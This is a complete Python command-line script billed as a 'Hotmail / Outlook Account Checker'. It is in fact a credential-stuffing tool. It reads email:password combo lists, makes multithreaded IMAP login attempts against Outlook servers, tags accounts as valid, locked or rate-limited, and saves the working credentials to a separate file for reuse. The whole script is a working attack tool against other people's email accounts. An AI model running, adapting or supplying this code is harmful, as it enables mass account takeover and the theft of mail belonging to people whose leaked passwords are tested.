#!/usr/bin/env python3
"""
Hotmail / Outlook Account Checker
Checks a list of Hotmail/Outlook accounts for:
  - Valid email format
  - Domain MX record existence
  - Login credentials (email:password format via IMAP)

Usage:
  python3 hotmail_checker.py -f accounts.txt
  python3 hotmail_checker.py -f emails.txt --mode smtp
  python3 hotmail_checker.py -f combos.txt --mode login --threads 10
"""

import argparse
import imaplib
import re
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from threading import Lock

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

IMAP_SERVERS = {
    "hotmail.com": "imap-mail.outlook.com",
    "outlook.com": "imap-mail.outlook.com",
    "live.com":    "imap-mail.outlook.com",
    "msn.com":     "imap-mail.outlook.com",
    "passport.com":"imap-mail.outlook.com",
}
IMAP_PORT = 993

EMAIL_REGEX = re.compile(
    r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$"
)

VALID_DOMAINS = set(IMAP_SERVERS.keys())

# Thread-safe counters
print_lock = Lock()
results_lock = Lock()

# ---------------------------------------------------------------------------
# Colour helpers
# ---------------------------------------------------------------------------

def _c(text: str, color: str) -> str:
    if not COLOR:
        return text
    return f"{color}{text}{Style.RESET_ALL}"

def ok(text):   return _c(text, Fore.GREEN)
def err(text):  return _c(text, Fore.RED)
def warn(text): return _c(text, Fore.YELLOW)
def info(text): return _c(text, Fore.CYAN)
def dim(text):  return _c(text, Fore.WHITE)

# ---------------------------------------------------------------------------
# Validation helpers
# ---------------------------------------------------------------------------

def is_valid_format(email: str) -> bool:
    return bool(EMAIL_REGEX.match(email))


def get_domain(email: str) -> str:
    return email.lower().split("@")[-1] if "@" in email else ""


def is_hotmail_domain(email: str) -> bool:
    return get_domain(email) in VALID_DOMAINS


def check_mx_record(domain: str) -> bool:
    if not DNS_AVAILABLE:
        return True  # assume valid if dnspython not available
    try:
        dns.resolver.resolve(domain, "MX", lifetime=5)
        return True
    except Exception:
        return False

# ---------------------------------------------------------------------------
# IMAP login check
# ---------------------------------------------------------------------------

def check_login(email: str, password: str, timeout: int = 10) -> dict:
    domain = get_domain(email)
    imap_host = IMAP_SERVERS.get(domain, "imap-mail.outlook.com")
    result = {
        "email": email,
        "password": password,
        "status": "unknown",
        "detail": "",
    }
    try:
        mail = imaplib.IMAP4_SSL(imap_host, IMAP_PORT, timeout=timeout)
        resp, _ = mail.login(email, password)
        if resp == "OK":
            result["status"] = "valid"
            result["detail"] = "Login successful"
            mail.logout()
        else:
            result["status"] = "invalid"
            result["detail"] = "Login rejected"
    except imaplib.IMAP4.error as exc:
        msg = str(exc).lower()
        if "invalid credentials" in msg or "authentication failed" in msg:
            result["status"] = "invalid"
            result["detail"] = "Wrong credentials"
        elif "too many" in msg or "rate" in msg:
            result["status"] = "rate_limited"
            result["detail"] = "Rate limited by server"
        elif "locked" in msg or "blocked" in msg:
            result["status"] = "locked"
            result["detail"] = "Account locked / blocked"
        else:
            result["status"] = "error"
            result["detail"] = str(exc)
    except (socket.timeout, TimeoutError):
        result["status"] = "timeout"
        result["detail"] = "Connection timed out"
    except OSError as exc:
        result["status"] = "error"
        result["detail"] = str(exc)
    return result


# ---------------------------------------------------------------------------
# Format-only / SMTP-style check (no credentials needed)
# ---------------------------------------------------------------------------

def check_format_and_domain(email: str) -> dict:
    result = {
        "email": email,
        "status": "unknown",
        "detail": "",
    }
    if not is_valid_format(email):
        result["status"] = "invalid_format"
        result["detail"] = "Invalid email format"
        return result

    if not is_hotmail_domain(email):
        result["status"] = "wrong_domain"
        result["detail"] = f"Not a Hotmail/Outlook domain ({get_domain(email)})"
        return result

    domain = get_domain(email)
    if not check_mx_record(domain):
        result["status"] = "no_mx"
        result["detail"] = "Domain has no MX record"
        return result

    result["status"] = "valid_format"
    result["detail"] = "Format & domain OK"
    return result


# ---------------------------------------------------------------------------
# Input parsing
# ---------------------------------------------------------------------------

def parse_line(line: str):
    """Return (email, password | None) from a raw input line."""
    line = line.strip()
    if not line or line.startswith("#"):
        return None, None

    if ":" in line:
        parts = line.split(":", 1)
        return parts[0].strip(), parts[1].strip()
    return line, None


def load_accounts(filepath: str):
    path = Path(filepath)
    if not path.exists():
        print(err(f"[ERROR] File not found: {filepath}"))
        sys.exit(1)

    accounts = []
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for raw in fh:
            email, password = parse_line(raw)
            if email:
                accounts.append((email, password))
    return accounts


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

STATUS_ICONS = {
    "valid":         ok("[✓ VALID]"),
    "valid_format":  ok("[✓ FORMAT OK]"),
    "invalid":       err("[✗ INVALID]"),
    "invalid_format":err("[✗ BAD FORMAT]"),
    "wrong_domain":  warn("[~ WRONG DOMAIN]"),
    "no_mx":         warn("[~ NO MX]"),
    "locked":        warn("[~ LOCKED]"),
    "rate_limited":  warn("[~ RATE LIMITED]"),
    "timeout":       warn("[~ TIMEOUT]"),
    "error":         err("[! ERROR]"),
    "unknown":       dim("[? UNKNOWN]"),
}

def format_result(r: dict, mode: str) -> str:
    icon = STATUS_ICONS.get(r["status"], dim("[?]"))
    if mode == "login":
        line = f"{icon}  {r['email']}:{r['password']}  |  {r['detail']}"
    else:
        line = f"{icon}  {r['email']}  |  {r['detail']}"
    return line


def write_output(results: list, out_dir: Path, mode: str):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    categories = {
        "valid":    [],
        "invalid":  [],
        "other":    [],
    }
    for r in results:
        if r["status"] in ("valid", "valid_format"):
            categories["valid"].append(r)
        elif r["status"] in ("invalid", "invalid_format", "wrong_domain", "no_mx"):
            categories["invalid"].append(r)
        else:
            categories["other"].append(r)

    out_dir.mkdir(parents=True, exist_ok=True)
    summary_path = out_dir / f"results_{timestamp}.txt"

    with open(summary_path, "w", encoding="utf-8") as fh:
        fh.write(f"Hotmail Checker Results — {datetime.now()}\n")
        fh.write(f"Mode: {mode}\n")
        fh.write("=" * 60 + "\n\n")

        for cat, items in categories.items():
            fh.write(f"[{cat.upper()}] ({len(items)})\n")
            for r in items:
                if mode == "login":
                    fh.write(f"  {r['email']}:{r['password']}  |  {r['detail']}\n")
                else:
                    fh.write(f"  {r['email']}  |  {r['detail']}\n")
            fh.write("\n")

    # Also write a simple valid-only file for easy reuse
    valid_path = out_dir / f"valid_{timestamp}.txt"
    with open(valid_path, "w", encoding="utf-8") as fh:
        for r in categories["valid"]:
            if mode == "login":
                fh.write(f"{r['email']}:{r['password']}\n")
            else:
                fh.write(f"{r['email']}\n")

    return summary_path, valid_path, categories


# ---------------------------------------------------------------------------
# Core runner
# ---------------------------------------------------------------------------

def process_account(args_tuple):
    email, password, mode, timeout = args_tuple
    if mode == "login":
        if not password:
            return {
                "email": email,
                "password": "",
                "status": "error",
                "detail": "No password provided for login mode",
            }
        fmt = check_format_and_domain(email)
        if fmt["status"] not in ("valid_format",):
            fmt["password"] = password
            return fmt
        return check_login(email, password, timeout)
    else:
        return check_format_and_domain(email)


def run_checker(accounts, mode, threads, timeout, delay, out_dir):
    total = len(accounts)
    results = []
    checked = 0

    print(info(f"\n[*] Checking {total} account(s) — mode={mode}, threads={threads}\n"))

    tasks = [(email, password, mode, timeout) for email, password in accounts]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(process_account, t): t for t in tasks}
        for future in as_completed(futures):
            result = future.result()
            checked += 1
            line = format_result(result, mode)
            with print_lock:
                print(f"  [{checked}/{total}] {line}")
            with results_lock:
                results.append(result)
            if delay > 0:
                time.sleep(delay)

    summary_path, valid_path, categories = write_output(results, out_dir, mode)

    print(info(f"\n{'='*60}"))
    print(info(f"  Results Summary"))
    print(info(f"{'='*60}"))
    print(ok(  f"  Valid    : {len(categories['valid'])}"))
    print(err( f"  Invalid  : {len(categories['invalid'])}"))
    print(warn( f"  Other    : {len(categories['other'])}"))
    print(info( f"  Total    : {total}"))
    print(info(f"\n  Full results : {summary_path}"))
    print(info(f"  Valid only   : {valid_path}\n"))

    return results


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(
        description="Hotmail / Outlook Account Checker",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument(
        "-f", "--file",
        required=True,
        metavar="FILE",
        help="Path to input file.\n"
             "  smtp mode  : one email per line\n"
             "  login mode : email:password per line",
    )
    p.add_argument(
        "--mode",
        choices=["smtp", "login"],
        default="smtp",
        help="Check mode (default: smtp)\n"
             "  smtp  — validate format + domain MX only (no password needed)\n"
             "  login — attempt IMAP login with provided credentials",
    )
    p.add_argument(
        "--threads",
        type=int,
        default=5,
        metavar="N",
        help="Number of concurrent threads (default: 5)",
    )
    p.add_argument(
        "--timeout",
        type=int,
        default=10,
        metavar="SEC",
        help="Connection timeout in seconds (default: 10)",
    )
    p.add_argument(
        "--delay",
        type=float,
        default=0.0,
        metavar="SEC",
        help="Delay between checks in seconds (default: 0)",
    )
    p.add_argument(
        "--output",
        default="results",
        metavar="DIR",
        help="Output directory for result files (default: results/)",
    )
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()

    accounts = load_accounts(args.file)
    if not accounts:
        print(err("[ERROR] No accounts found in input file."))
        sys.exit(1)

    run_checker(
        accounts=accounts,
        mode=args.mode,
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay,
        out_dir=Path(args.output),
    )


if __name__ == "__main__":
    main()
